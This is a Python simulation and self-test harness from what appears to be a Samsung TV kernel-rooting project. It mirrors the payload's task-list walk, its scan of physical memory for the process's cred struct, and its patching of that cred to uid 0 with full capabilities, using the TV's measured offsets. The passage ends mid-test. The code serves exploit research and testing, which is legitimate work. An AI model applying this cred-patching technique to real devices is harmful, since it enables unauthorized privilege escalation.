"""In-memory physmap RPC — offline stand-in for a live TV stub.

The QEMU kernel in the research tree (`samsungtv/research/sim`) builds, but it
never prints a console, so it cannot drive these tools. This file is the PC-side
replacement: a dict-backed `read` / `write32` / `readmany` that duck-types
`physmap.RPC`, planted with the cred layout measured on the TV and confirmed
against that kernel's DWARF.

    python tools/sim_rpc.py           # self-test, no TV, no server
    from sim_rpc import MemRPC, plant_cred

Offsets below are the ones the payload and `kernel_root.py` already use.
`cred.uid` is +4; `cap_inheritable` is +0x28. `patch_full` must verify uid
at +4, not inheritable.

Beyond a planted cred, the self-test twins the payload hunt (`hunt_new_phyrfork`),
the v18 cache-alias (userspace mapping vs kernel RAM), the v20 exclusive
`/dev/video40` opener, the LPAE pointers above `0xE0000000`, and the v24–v29
cold-boot attempt-1 model (`ReadStaleRPC` + `direct_parent_patch`): kernel dirty
lines for hot pages (a running task's struct, the app's own cred) that a
non-aliasing physmap mapping can never see, the v28 early break, and the v30
process-wide cred-scan budget.
"""
from __future__ import annotations

import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import kernel_root as K  # noqa: E402
import physmap as T  # noqa: E402

PAGE = 0x1000
OWNER_UID = 5001
OWNER_GID = 100
OWNER_IDS = (OWNER_UID, OWNER_GID) * 4
OWNER_PAT = struct.pack("<8I", *OWNER_IDS)
CAP_FULL = 0x3FFFFFFFFF

# task_struct / cred — TV-measured, DWARF-matched on the pontusml sim kernel
O_TASKS = 0x23C
O_REAL_PARENT = 0x2F0
O_PARENT = 0x2F4
O_REAL_CRED = 0x3F4
O_CRED = 0x3F8
O_COMM = 0x400
PHYS_OFF = 0xA0000000
UNREADABLE = 0xFFFFFFFF
O_USAGE = 0x00
O_UID = 0x04
O_CAP_INHERITABLE = 0x28
O_CAP_PERMITTED = 0x30
O_CAP_EFFECTIVE = 0x38


class MemRPC:
    """Sparse physical memory. Same method names as `physmap.RPC`.

    Page bases in `holes` fail the way a live stub fails a bad PA: `read`
    raises, `readmany` yields `None` so `iter_owner_creds` breaks its carry.
    """

    def __init__(self):
        self.pages: dict[int, bytearray] = {}
        self.holes: set[int] = set()

    def _page(self, phys: int) -> bytearray:
        base = phys & ~0xFFF
        buf = self.pages.get(base)
        if buf is None:
            buf = bytearray(PAGE)
            self.pages[base] = buf
        return buf

    def _raise_if_hole(self, phys: int) -> None:
        if (phys & ~0xFFF) in self.holes:
            raise OSError(f"unreadable phys {phys:#x}")

    def read(self, phys: int, n: int) -> bytes:
        out = bytearray()
        while n > 0:
            self._raise_if_hole(phys)
            buf = self._page(phys)
            off = phys & 0xFFF
            chunk = min(n, PAGE - off)
            out.extend(buf[off : off + chunk])
            phys += chunk
            n -= chunk
        return bytes(out)

    def read_u32(self, phys: int) -> int:
        return struct.unpack_from("<I", self.read(phys, 4))[0]

    def write32(self, phys: int, val: int) -> int:
        buf = self._page(phys)
        off = phys & 0xFFF
        if off + 4 > PAGE:
            return -1
        struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)
        return 0

    def write(self, phys: int, data: bytes) -> None:
        for i, b in enumerate(data):
            buf = self._page(phys + i)
            buf[(phys + i) & 0xFFF] = b

    def readmany(self, first_page: int, count: int):
        page = first_page
        for _ in range(count):
            if page in self.holes:
                yield page, None
            else:
                yield page, bytes(self._page(page))
            page += PAGE


class AliasedMemRPC(MemRPC):
    """Userspace physmap vs kernel RAM.

    `read` MapPage-caches a copy. Later `write32` hits that copy. `flush`
    (cacheflush) copies it back; `drop_pages` (munmap) discards it. Kernel
    RAM is what `kernel_u32` / getuid() would see.

    v17 attempt 3 of the 3.5 min boot: PatchCred readback was uid 0 in the
    mapping while getuid() stayed 5001. The ARM stub never hits this because
    it munmaps every op.
    """

    def __init__(self):
        super().__init__()
        self._map: dict[int, bytearray] = {}

    def drop_pages(self) -> None:
        self._map.clear()

    def flush(self) -> None:
        for base, snap in self._map.items():
            self.pages[base] = bytearray(snap)

    def kernel_u32(self, phys: int) -> int:
        buf = MemRPC._page(self, phys)
        off = phys & 0xFFF
        return struct.unpack_from("<I", buf, off)[0]

    def poke_kernel(self, phys: int, data: bytes) -> None:
        """Write kernel RAM without touching a live mapping."""
        for i, b in enumerate(data):
            buf = MemRPC._page(self, phys + i)
            buf[(phys + i) & 0xFFF] = b

    def _mapped(self, phys: int) -> bytearray:
        base = phys & ~0xFFF
        snap = self._map.get(base)
        if snap is None:
            snap = bytearray(MemRPC._page(self, phys))
            self._map[base] = snap
        return snap

    def read(self, phys: int, n: int) -> bytes:
        out = bytearray()
        while n > 0:
            self._raise_if_hole(phys)
            buf = self._mapped(phys)
            off = phys & 0xFFF
            chunk = min(n, PAGE - off)
            out.extend(buf[off : off + chunk])
            phys += chunk
            n -= chunk
        return bytes(out)

    def write32(self, phys: int, val: int) -> int:
        off = phys & 0xFFF
        if off + 4 > PAGE:
            return -1
        base = phys & ~0xFFF
        buf = self._map[base] if base in self._map else MemRPC._page(self, phys)
        struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)
        return 0

    def write(self, phys: int, data: bytes) -> None:
        for i, b in enumerate(data):
            p = phys + i
            base = p & ~0xFFF
            buf = self._map[base] if base in self._map else MemRPC._page(self, p)
            buf[p & 0xFFF] = b


class ReadStaleRPC(MemRPC):
    """Kernel-written data the physmap read path cannot see yet.

    Cold-boot attempt-1 model (Fifth pass, docs/OPEN-ISSUES.md): the kernel's
    dirty L1 line for a page it keeps touching - a running task's struct, the
    app's own cred, hit on every permission check - is never written back, and a
    physmap mapping that does not share the kernel's VIPT cache set reads stale
    RAM.  Pages whose kernel line does write back read fine, which is exactly
    the observed asymmetry: the fork child's comm reads coherently (the walk
    finds it) while the parent-side cred uid never reads 5001.

    `kernel_write` = the kernel wrote the page (dirty line, kernel view only).
    `kernel_read` = what getuid() would see.  `publish` = the page becoming
    visible to the physmap read path - the line finally evicted, or an
    alias-correct mapping (VA == PA mod the 32 KiB alias period) sharing the
    kernel's cache line.  Our own write32/write go to BOTH views: an
    alias-correct mapping makes our cache line the kernel's line, so a patch is
    immediately visible to getuid() (the v18 direction).  DropPages cannot help
    here: remapping never touches the kernel's line - which is why the
    pre-v29 in-process retries (8 of them before the v28 early break) failed.
    """

    def __init__(self):
        super().__init__()
        self.dirty: dict[int, bytearray] = {}

    def _dirty_page(self, phys: int) -> bytearray:
        base = phys & ~0xFFF
        buf = self.dirty.get(base)
        if buf is None:
            buf = bytearray(MemRPC._page(self, base))
            self.dirty[base] = buf
        return buf

    def kernel_write(self, phys: int, data: bytes) -> None:
        for i, b in enumerate(data):
            self._dirty_page(phys + i)[(phys + i) & 0xFFF] = b

    def kernel_read(self, phys: int, n: int) -> bytes:
        out = bytearray()
        while n > 0:
            base = phys & ~0xFFF
            off = phys & 0xFFF
            chunk = min(n, PAGE - off)
            if base in self.dirty:
                out.extend(self.dirty[base][off : off + chunk])
            else:
                out.extend(MemRPC.read(self, phys, chunk))
            phys += chunk
            n -= chunk
        return bytes(out)

    def publish(self, phys: int | None = None) -> None:
        """A page (or everything) becomes visible to the physmap read path."""
        if phys is None:
            for base, buf in self.dirty.items():
                self.pages[base] = bytearray(buf)
            self.dirty.clear()
            return
        base = phys & ~0xFFF
        if base in self.dirty:
            self.pages[base] = self.dirty.pop(base)

    def write32(self, phys: int, val: int) -> int:
        st = MemRPC.write32(self, phys, val)
        if st == 0:
            self.kernel_write(phys, struct.pack("<I", val & 0xFFFFFFFF))
        return st

    def write(self, phys: int, data: bytes) -> None:
        MemRPC.write(self, phys, data)
        self.kernel_write(phys, data)


class Video40:
    """One RDWR opener. `fork()` duplicates the fd; the next `open` fails
    until every copy is closed. v20 reopened after fork and got fd=-1."""

    def __init__(self):
        self.n = 0

    def open(self) -> int:
        if self.n:
            return -1
        self.n += 1
        return 0

    def close(self) -> None:
        if self.n:
            self.n -= 1

    def fork(self) -> None:
        if self.n:
            self.n += 1


def plant_cred(rpc: MemRPC, phys: int, *, uid: int = OWNER_UID, gid: int = OWNER_GID,
               usage: int = 4, inheritable: int = 0, permitted: int = 0,
               effective: int = 0) -> int:
    """Write a `struct cred` at `phys`. Returns `phys`."""
    rpc.write32(phys + O_USAGE, usage)
    ids = (uid, gid) * 4
    rpc.write(phys + O_UID, struct.pack("<8I", *ids))
    rpc.write(phys + O_CAP_INHERITABLE, inheritable.to_bytes(8, "little"))
    rpc.write(phys + O_CAP_PERMITTED, permitted.to_bytes(8, "little"))
    rpc.write(phys + O_CAP_EFFECTIVE, effective.to_bytes(8, "little"))
    return phys


def v2p(virt: int) -> int:
    return (virt - PHYS_OFF) & 0xFFFFFFFF


def kptr(v: int) -> bool:
    return v >= 0xC0000000


def plant_task(rpc: MemRPC, phys: int, comm: bytes, cred_phys: int,
               parent_phys: int | None = None,
               real_parent_phys: int | None = None) -> int:
    """Minimal task_struct: comm, cred, real_parent/parent. Returns virt."""
    virt = (phys + PHYS_OFF) & 0xFFFFFFFF
    rpc.write(phys + O_COMM, comm[:15] + b"\x00")
    cv = (cred_phys + PHYS_OFF) & 0xFFFFFFFF
    rpc.write32(phys + O_CRED, cv)
    rpc.write32(phys + O_REAL_CRED, cv)
    rp = real_parent_phys if real_parent_phys is not None else parent_phys
    if rp is not None:
        rpc.write32(phys + O_REAL_PARENT, (rp + PHYS_OFF) & 0xFFFFFFFF)
    if parent_phys is not None:
        rpc.write32(phys + O_PARENT, (parent_phys + PHYS_OFF) & 0xFFFFFFFF)
    return virt


def cred_uid(rpc: MemRPC, cred: int) -> int:
    """Twin of payload `CredUid`. 0xFFFFFFFF if the pointer is not a kptr
    or the page is unreadable."""
    if not kptr(cred):
        return UNREADABLE
    try:
        return rpc.read_u32(v2p(cred) + O_UID)
    except Exception:
        return UNREADABLE


def child_parent_uid(rpc: MemRPC, child_virt: int) -> int:
    """Twin of payload `ChildParentUid`. 5001 / 0 / foreign / 0xFFFFFFFF."""
    saw = UNREADABLE
    child_p = v2p(child_virt)
    for po in (O_REAL_PARENT, O_PARENT):
        try:
            parent = rpc.read_u32(child_p + po)
        except Exception:
            continue
        if not kptr(parent) or parent == child_virt:
            continue
        try:
            cred = rpc.read_u32(v2p(parent) + O_CRED)
        except Exception:
            cred = 0
        u = cred_uid(rpc, cred)
        if u == OWNER_UID:
            return OWNER_UID
        if u != UNREADABLE:
            saw = u
        try:
            real = rpc.read_u32(v2p(parent) + O_REAL_CRED)
        except Exception:
            real = 0
        if kptr(real):
            ru = cred_uid(rpc, real)
            if ru == OWNER_UID:
                return OWNER_UID
            if ru != UNREADABLE:
                saw = ru
    return saw


def latch_new_phyrfork(parent_uids: list[int]) -> int | None:
    """Which new PHYRFORK to hunt. Last match wins; 5001 beats anything else.

    v21 required uid 5001. v22 also latched 0 / unreadable and still missed
    cold-boot attempt 1 (`seen=1 skip-orphan=1`, parent uid some other stale
    word). v23 latches every new landmark; `pre` is what excludes leftovers.
    `PatchCred` still writes uid 5001 only. Twin of the payload hunt.
    Returns index into `parent_uids`, or None.
    """
    ours = maybe = None
    for i, u in enumerate(parent_uids):
        if u == OWNER_UID:
            ours = i
        else:
            maybe = i
    return ours if ours is not None else maybe


def link_tasks_prev(rpc: MemRPC, init_phys: int, tail_first: list[int],
                    off: int = O_TASKS) -> int:
    """Circular `tasks.prev` chain. `tail_first[0]` is walked first.

    init.tasks.prev -> task0+off, each task.prev -> next, last.prev -> init+off.
    Returns init virt.
    """
    init_virt = (init_phys + PHYS_OFF) & 0xFFFFFFFF
    head = (init_virt + off) & 0xFFFFFFFF

    def entry(phys: int) -> int:
        return (PHYS_OFF + phys + off) & 0xFFFFFFFF

    rpc.write32(init_phys + off + 4, entry(tail_first[0]))
    for a, b in zip(tail_first, tail_first[1:]):
        rpc.write32(a + off + 4, entry(b))
    rpc.write32(tail_first[-1] + off + 4, head)
    return init_virt


def walk_prev(rpc: MemRPC, init_phys: int, init_virt: int,
              off: int = O_TASKS, hops: int = 200):
    """Yield task virts walking init.tasks.prev."""
    head = (init_virt + off) & 0xFFFFFFFF
    cur = rpc.read_u32(init_phys + off + 4)
    for _ in range(hops):
        if not kptr(cur) or cur == head:
            return
        task = (cur - off) & 0xFFFFFFFF
        yield task
        cur = rpc.read_u32(v2p(cur) + 4)


def hunt_new_phyrfork(rpc: MemRPC, init_phys: int, init_virt: int,
                      pre: set[int] | None = None) -> tuple[int, int, int]:
    """Twin of the payload hunt loop. Returns (child_virt, seen, skip_orphan).

    Skips PHYRFORK already in `pre` (orphans from the last round). Last match
    wins; a uid-5001 parent beats any other. child=0 means none.
    """
    pre = pre or set()
    ours = maybe = 0
    seen = skip = 0
    for task in walk_prev(rpc, init_phys, init_virt):
        nm = rpc.read(v2p(task) + O_COMM, 16)
        if nm.startswith(b"PHYRFORK") and task not in pre:
            seen += 1
            pu = child_parent_uid(rpc, task)
            if pu == OWNER_UID:
                ours = task
            else:
                skip += 1
                maybe = task
    return (ours if ours else maybe), seen, skip


def kernel_uid(rpc, parent_virt: int) -> int:
    """getuid() twin: kernel view of the parent task's cred uid."""
    try:
        cred = struct.unpack_from("<I", rpc.kernel_read(v2p(parent_virt) + O_CRED, 4))[0]
        return struct.unpack_from("<I", rpc.kernel_read(v2p(cred) + O_UID, 4))[0]
    except Exception:
        return UNREADABLE


def uid_word(u: int) -> str:
    """Beacon spelling of a CredUid result: 0xFFFFFFFF reads as `unread`."""
    return "unread" if u == UNREADABLE else str(u)


def patch_gate(rpc, cred: int) -> bool:
    """Payload PatchCred twin: write only when the uid reads 5001.

    Unlike `kernel_root.patch_ours` (which treats a uid-0 read as "already
    done"), PatchCred refuses 0: its callers only call it after they saw 5001,
    so a 0 here means the read moved under us and must not be trusted.
    """
    if cred_uid(rpc, cred) != OWNER_UID:
        return False
    return K.patch_full(rpc, cred)


def direct_parent_patch(rpc, child_virt: int, *, beacon,
                        retries: int = 8,
                        probe_prs: tuple[int, ...] = (0, -1)):
    """Twin of the payload's direct-parent block (Program.cs, v28–v29).

    Walks child->real_parent (0x2F0) / ->parent (0x2F4), reads the parent's
    cred/real_cred, patches ONLY a cred whose uid reads 5001, and records the
    v24 `direct-probe` diagnostics when the gate stays closed (probe_prs = first
    and last retry).  v28's early break is modelled: after three retries that
    never saw a kernel pointer in cred/real_cred, stop re-reading the dead
    pointer line and hand over to the scan (the caller's next block).  Returns
    (rooted, probes); probes are (pr, po, parent, cred, uid) and `rooted` is
    the getuid() twin: the kernel view of the parent task's cred uid == 0.
    """
    want_probes = {p if p >= 0 else retries - 1 for p in probe_prs}
    probes: list[tuple[int, int, int, int, int]] = []
    parent_seen = 0
    rooted = False
    saw_kptr = False

    def is_rooted() -> bool:
        return parent_seen != 0 and kernel_uid(rpc, parent_seen) == 0

    for pr in range(retries):
        # Control read: the child's own cred is a fork-fresh page (its comm
        # proved coherent in the walk).  cuid reading 5001 while the
        # parent-side probes do not pins the staleness on the running parent's
        # pages.  The child cred itself is a fork() COPY - never patched.
        cc = 0
        cu = UNREADABLE
        try:
            cc = rpc.read_u32(v2p(child_virt) + O_CRED)
        except Exception:
            cc = 0
        if kptr(cc):
            cu = cred_uid(rpc, cc)
        for po in (O_REAL_PARENT, O_PARENT):
            try:
                parent = rpc.read_u32(v2p(child_virt) + po)
            except Exception:
                parent = 0
            cred = real = 0
            if kptr(parent) and parent != child_virt:
                parent_seen = parent
                try:
                    cred = rpc.read_u32(v2p(parent) + O_CRED)
                except Exception:
                    cred = 0
                try:
                    real = rpc.read_u32(v2p(parent) + O_REAL_CRED)
                except Exception:
                    real = 0
            if kptr(cred) or kptr(real):
                saw_kptr = True
            u = cred_uid(rpc, cred)
            if u == OWNER_UID:
                beacon(f"direct-parent+{po:x}={parent:08x} cred={cred:08x}")
                if not patch_gate(rpc, cred):
                    beacon(f"direct-patch-fail po={po:x} cred={cred:08x}")
            if kptr(real) and real != cred and cred_uid(rpc, real) == OWNER_UID:
                if not patch_gate(rpc, real):
                    beacon(f"direct-patch-fail real={real:08x}")
            # The probes are silent on success; on the failure path they say
            # WHICH read was wrong: uid 0 = stale zeros, a number = stale word,
            # unread = cred pointer not a kptr or the cred page unreadable,
            # 5001 = the gate OPENED but the write did not stick.  With a kptr
            # cred the line carries plain/head; without one (v27 cold boot) it
            # carries the pointer-line diagnostics pplain/phead.
            if not is_rooted() and u != OWNER_UID and pr in want_probes:
                probes.append((pr, po, parent, cred, u))
                if kptr(cred):
                    try:
                        head = rpc.read(v2p(cred), 18).hex()
                    except Exception:
                        head = "err"
                    extra = f" plain={uid_word(u)} head={head}"
                else:
                    pplain = UNREADABLE
                    phead = "-"
                    if kptr(parent):
                        try:
                            pplain = rpc.read_u32(v2p(parent) + O_CRED)
                        except Exception:
                            pplain = UNREADABLE
                        try:
                            phead = rpc.read(v2p(parent) + 0x3F0, 24).hex()
                        except Exception:
                            phead = "err"
                    extra = (f" pplain={uid_word(pplain)} phead={phead}"
                             f" pmap=- ppva=-")
                beacon(f"direct-probe pr={pr} po={po:x} parent={parent:08x} "
                       f"cred={cred:08x} uid={uid_word(u)}{extra} "
                       f"ccred={cc:08x} cuid={uid_word(cu)}")
            if is_rooted():
                break
        if is_rooted():
            break
        if pr == 2 and not saw_kptr:
            break
    return is_rooted(), probes


def cred_scan_near(rpc, child_cred_phys: int, *, exclude_phys: int,
                   is_rooted, max_steps: int = 256, max_patched: int = 8,
                   budget: list[int] | None = None):
    """Twin of payload `CredScanNear` (v28, budget/twin fixes in v30).

    Scans outward from the child's cred page (lower physical addresses first),
    patches every SANE uid-5001 cred except the child's own, and stops when
    `is_rooted()` flips - the one that roots us is ours.  `budget` is a
    one-element list modelling the C# process-wide `_scanPatched` (default a
    fresh `[0]`); v29 had the cap per call, which its four rounds multiplied.
    A pattern at page offset 0-3 belongs to a cred object that starts in the
    previous page; it is skipped, but the page is still searched further (the
    old `while off >= 4` aborted the page).  A normal slab cred fits inside one
    page, so the page-local pattern find is correct; the offset-0 case is the
    rare straddler and is left to the page-local refusal.  Returns
    (rooted, patched).
    """
    pat = struct.pack("<8I", *(((OWNER_UID, OWNER_GID)) * 4))
    page0 = child_cred_phys & ~0xFFF
    patched = 0
    if budget is None:
        budget = [0]
    if max_patched <= 0 or budget[0] >= max_patched:
        return is_rooted(), 0
    for step in range(max_steps + 1):
        if is_rooted() or budget[0] >= max_patched:
            break
        for dirn in ((0,) if step == 0 else (-1, 1)):
            page = (page0 + dirn * step * PAGE) & 0xFFFFFFFF
            # The C# bounds the scan to the ARM32 direct map's RAM window.
            if page < 0x20000000 or page >= 0x60000000:
                continue
            try:
                data = rpc.read(page, PAGE)
            except Exception:
                continue
            off = data.find(pat)
            while off >= 0:
                if off >= 4:
                    cred_p = page + off - 4
                    cred_v = (cred_p + PHYS_OFF) & 0xFFFFFFFF
                    if cred_p != exclude_phys and cred_uid(rpc, cred_v) == OWNER_UID \
                            and K._sane_cred(rpc, cred_v):
                        if patch_gate(rpc, cred_v):
                            patched += 1
                            budget[0] += 1
                            if is_rooted():
                                return True, patched
                            if budget[0] >= max_patched:
                                return False, patched
                off = data.find(pat, off + 1)
    return is_rooted(), patched


def find_owner_pat(pages: list[bytes], overlap: int = 0) -> list[int]:
    """Page-local `bytes.find(OWNER_PAT)`, optionally with an overlap window.

    `overlap=0` is what `scan_cred.py` / `tv_rootwatch.py` do today.
    `overlap=31` catches a 32-byte pattern that straddles two pages.
    """
    hits = []
    if overlap:
        blob = b"".join(pages)
        off = 0
        while True:
            i = blob.find(OWNER_PAT, off)
            if i < 0:
                break
            hits.append(i)
            off = i + 1
        return hits
    base = 0
    for data in pages:
        off = 0
        while True:
            i = data.find(OWNER_PAT, off)
            if i < 0:
                break
            hits.append(base + i)
            off = i + 1
        base += len(data)
    return hits


def _check(name: str, ok: bool, note: str) -> bool:
    print(("PASS" if ok else "FAIL"), name, "-", note, flush=True)
    return ok


def selftest() -> int:
    failed = 0

    failed += not _check(
        "layout constants",
        (K.O_COMM, K.O_CRED, K.O_REAL, K.O_CAP_PERMITTED, K.O_CAP_EFFECTIVE)
        == (O_COMM, O_CRED, O_REAL_CRED, O_CAP_PERMITTED, O_CAP_EFFECTIVE),
        "kernel_root.py matches the DWARF/TV cred and task offsets",
    )

    failed += not _check(
        "kptr accepts LPAE high half",
        kptr(0xE0123456) and T._kernel_ptr(0xE0123456)
        and kptr(0xC0000000) and T._kernel_ptr(0xC0000000)
        and not kptr(0xBFFFFFFF) and not T._kernel_ptr(0xBFFFFFFF),
        "trap 5: never bound kernel pointers at 0xE0000000",
    )

    rpc = MemRPC()
    cred = plant_cred(rpc, 0x20100000, usage=4)
    virt = cred + 0xA0000000
    failed += not _check(
        "_sane_cred owner",
        K._sane_cred(rpc, virt),
        f"usage=4 uid={OWNER_UID} at cred {T.hexs(cred)}",
    )
    plant_cred(rpc, 0x20101000, usage=0x20000)
    failed += not _check(
        "_sane_cred rejects huge usage",
        not K._sane_cred(rpc, 0x20101000 + 0xA0000000),
        "usage=0x20000 is not a real cred",
    )
    failed += not _check(
        "_sane_cred rejects unaligned",
        not K._sane_cred(rpc, virt + 1),
        "cred pointers are 4-byte aligned",
    )

    plant_cred(rpc, cred, usage=4, inheritable=0x11223344)
    ok_ids = T.patch_cred(rpc, cred)
    back = struct.unpack("<8I", rpc.read(cred + O_UID, 32))
    failed += not _check(
        "patch_cred zeros ids",
        ok_ids and all(v == 0 for v in back),
        f"ids after patch = {back}",
    )

    # Non-zero inheritable used to make patch_full return False (it read +0x28 as uid).
    plant_cred(rpc, cred, usage=4, inheritable=0x11223344)
    reported = K.patch_full(rpc, cred)
    real_uid = rpc.read_u32(cred + O_UID)
    perm = int.from_bytes(rpc.read(cred + O_CAP_PERMITTED, 8), "little")
    failed += not _check(
        "patch_full uid readback",
        reported and real_uid == 0 and perm == CAP_FULL,
        f"uid at +{O_UID}={real_uid} inheritable left at +{O_CAP_INHERITABLE}; returned {reported}",
    )

    p1 = b"\x00" * (PAGE - 16) + OWNER_PAT[:16]
    p2 = OWNER_PAT[16:] + b"\x00" * (PAGE - 16)
    failed += not _check(
        "owner-pat page straddle",
        find_owner_pat([p1, p2], overlap=0) == []
        and find_owner_pat([p1, p2], overlap=31) != [],
        "32-byte pattern split 16/16 is invisible per page, visible with overlap=31",
    )

    # The REAL scanner used by scan_cred.py / tv_rootwatch.py must find a cred
    # whose ids straddle the page boundary (M5).  Plant one 16 bytes before it.
    rpc2 = MemRPC()
    base = 0x20200000
    straddle = base + PAGE - 20            # ids at straddle+4 = base+PAGE-16
    plant_cred(rpc2, straddle, usage=4)
    found = list(K.iter_owner_creds(rpc2, base, base + 2 * PAGE))
    failed += not _check(
        "iter_owner_creds page straddle",
        straddle in found,
        f"cred at {T.hexs(straddle)}; found {[T.hexs(f) for f in found]}",
    )
    per_page = [bytes(rpc2.read(base + i * PAGE, PAGE)) for i in range(2)]
    failed += not _check(
        "old page-local scan misses it",
        find_owner_pat(per_page, overlap=0) == [],
        "this is the M5 bug the carry window fixes",
    )

    ordinary = [base + PAGE + 0x80, base + 2 * PAGE + 0x100, base + 3 * PAGE + 0x40]
    for addr in ordinary:
        plant_cred(rpc2, addr, usage=2)
    found = set(K.iter_owner_creds(rpc2, base, base + 4 * PAGE))
    failed += not _check(
        "iter_owner_creds ordinary hits",
        all(a in found for a in ordinary),
        f"planted {[T.hexs(a) for a in ordinary]}, found {len(found)}",
    )

    # A failed page is not physically adjacent to the next good one: the carry
    # must drop, or a split pattern across the hole would be a false hit.
    rpc_hole = MemRPC()
    hole_base = 0x20600000
    hole_straddle = hole_base + PAGE - 20
    plant_cred(rpc_hole, hole_straddle, usage=4)
    rpc_hole.holes.add(hole_base + PAGE)          # second half of the ids
    found_hole = list(K.iter_owner_creds(rpc_hole, hole_base, hole_base + 2 * PAGE))
    failed += not _check(
        "iter_owner_creds drops carry on a hole",
        hole_straddle not in found_hole,
        f"straddle {T.hexs(hole_straddle)} must not survive a missing page",
    )
    rpc_hole.holes.clear()
    found_ok = list(K.iter_owner_creds(rpc_hole, hole_base, hole_base + 2 * PAGE))
    failed += not _check(
        "iter_owner_creds finds it once the hole is gone",
        hole_straddle in found_ok,
        "same plant, both pages readable",
    )

    failed += not _check(
        "write32 refuses a page-straddling store",
        rpc.write32((PAGE - 2), 1) == -1
        and rpc.write32(0x20100FFC, 1) == 0,
        "ARM stub / MemRPC both reject a 4-byte write that crosses a page",
    )
    # 8-byte read that does cross a page is fine (two chunks).
    rpc.write32(0x20100FFC, 0x11111111)
    rpc.write32(0x20101000, 0x22222222)
    cross = rpc.read(0x20100FFC, 8)
    failed += not _check(
        "read spans a page",
        cross == b"\x11\x11\x11\x11\x22\x22\x22\x22",
        "read() walks pages; write32 does not",
    )

    # tv_rootwatch.root_by_tail: a stale tag whose cred reads uid 0 must not
    # short-circuit before the live uid-5001 tag.  This is the watchdog twin of
    # the root_via_fork first-hit bug (docs/OPEN-ISSUES.md).
    import tv_rootwatch as V
    rpc3 = MemRPC()
    head = (V.INIT_V + V.OFF) & 0xFFFFFFFF

    def entry(phys):
        return (0xA0000000 + phys + V.OFF) & 0xFFFFFFFF

    t_stale, t_live = 0x20100000, 0x20102000
    cred_stale, cred_live = 0x20101000, 0x20103000
    rpc3.write32(V.INIT_P + V.OFF + 4, entry(t_stale))
    rpc3.write32(t_stale + V.OFF + 4, entry(t_live))
    rpc3.write32(t_live + V.OFF + 4, head)
    for phys, cphys in ((t_stale, cred_stale), (t_live, cred_live)):
        rpc3.write(phys + K.O_COMM, b"PHYSRPC1" + b"\x00" * 8)
        rpc3.write32(phys + K.O_CRED, 0xA0000000 + cphys)
        rpc3.write32(phys + K.O_REAL, 0xA0000000 + cphys)
    plant_cred(rpc3, cred_stale, uid=0, gid=0, usage=4)       # stale: uid 0
    plant_cred(rpc3, cred_live, uid=5001, gid=100, usage=4)   # live: ours
    state = V.root_by_tail(rpc3)
    live_ids = struct.unpack("<8I", rpc3.read(cred_live + 4, 32))
    stale_caps = int.from_bytes(rpc3.read(cred_stale + O_CAP_PERMITTED, 8), "little")
    failed += not _check(
        "root_by_tail skips a stale uid-0 tag",
        state == "rooted" and all(v == 0 for v in live_ids) and stale_caps == 0,
        f"state={state!r} live_ids={live_ids} stale cap_permitted={stale_caps:#x}",
    )
    failed += not _check(
        "root_by_tail reports 'already' only when ours is root",
        V.root_by_tail(rpc3) == "already",
        "second pass: the live cred now reads uid 0, so nothing left to patch",
    )

    # kernel_root.patch_ours: the browser-lane twin of the payload's v15 gate.
    rpc4 = MemRPC()
    zero_cred = plant_cred(rpc4, 0x20300000, uid=0, gid=0, usage=4)
    ours_cred = plant_cred(rpc4, 0x20301000, uid=5001, gid=100, usage=4)
    foreign = plant_cred(rpc4, 0x20302000, uid=1234, gid=1000, usage=4)
    caps_before = int.from_bytes(rpc4.read(zero_cred + O_CAP_PERMITTED, 8), "little")
    ok_zero = K.patch_ours(rpc4, 0xA0000000 + zero_cred)
    caps_after = int.from_bytes(rpc4.read(zero_cred + O_CAP_PERMITTED, 8), "little")
    ok_ours = K.patch_ours(rpc4, 0xA0000000 + ours_cred)
    ok_foreign = K.patch_ours(rpc4, 0x20302000 + 0xA0000000)
    ours_ids = struct.unpack("<8I", rpc4.read(ours_cred + 4, 32))
    foreign_ids = struct.unpack("<8I", rpc4.read(foreign + 4, 32))
    failed += not _check(
        "patch_ours leaves a uid-0 cred alone",
        ok_zero and caps_before == 0 and caps_after == 0,
        f"returned {ok_zero}, cap_permitted {caps_before:#x} -> {caps_after:#x}",
    )
    failed += not _check(
        "patch_ours writes uid 5001 only",
        ok_ours and all(v == 0 for v in ours_ids)
        and ok_foreign is False and foreign_ids[0] == 1234,
        f"ours={ours_ids} foreign={foreign_ids} foreign_ok={ok_foreign}",
    )

    # Payload hunt latch (v22). v21 required parent uid 5001 and dropped the
    # cold-boot landmark whose cred still read as zeros (seen=1 skip-orphan=1).
    failed += not _check(
        "latch prefers uid 5001",
        latch_new_phyrfork([0, OWNER_UID, 0]) == 1,
        "live ours beats stale zeros on either side",
    )
    failed += not _check(
        "latch keeps stale uid-0 (v21 bug)",
        latch_new_phyrfork([0]) == 0
        and latch_new_phyrfork([UNREADABLE]) == 0
        and latch_new_phyrfork([1234]) == 0
        and latch_new_phyrfork([]) is None,
        "v23 latches zeros/unreadable/foreign; only an empty list is none",
    )

    rpc5 = MemRPC()
    parent_p, child_p = 0x20400000, 0x20401000
    live_cred = plant_cred(rpc5, 0x20402000, uid=5001, gid=100, usage=4)
    plant_task(rpc5, parent_p, b"PHYSRPT1", live_cred)
    cv = plant_task(rpc5, child_p, b"PHYRFORK", live_cred, parent_phys=parent_p)
    failed += not _check(
        "child_parent_uid live 5001",
        child_parent_uid(rpc5, cv) == OWNER_UID,
        "real_parent cred uid 5001",
    )
    plant_cred(rpc5, live_cred, uid=0, gid=0, usage=4)
    stale_uid = child_parent_uid(rpc5, cv)
    failed += not _check(
        "child_parent_uid stale zeros still latchable",
        stale_uid == 0 and latch_new_phyrfork([stale_uid]) == 0,
        f"uid={stale_uid} must not be dropped the way v21 skip-orphan did",
    )
    plant_cred(rpc5, live_cred, uid=1234, gid=1000, usage=4)
    foreign_uid = child_parent_uid(rpc5, cv)
    failed += not _check(
        "child_parent_uid foreign still latched (v23)",
        foreign_uid == 1234 and latch_new_phyrfork([foreign_uid]) == 0,
        f"uid={foreign_uid} is a stale-looking word; pre excludes real leftovers",
    )

    # real_parent (0x2F0) still zeros, parent (0x2F4) already 5001 — 5001 wins.
    rpc_mix = MemRPC()
    p_stale, p_live = 0x20700000, 0x20701000
    c_mix = 0x20702000
    cred_stale = plant_cred(rpc_mix, 0x20703000, uid=0, gid=0, usage=4)
    cred_live = plant_cred(rpc_mix, 0x20704000, uid=5001, gid=100, usage=4)
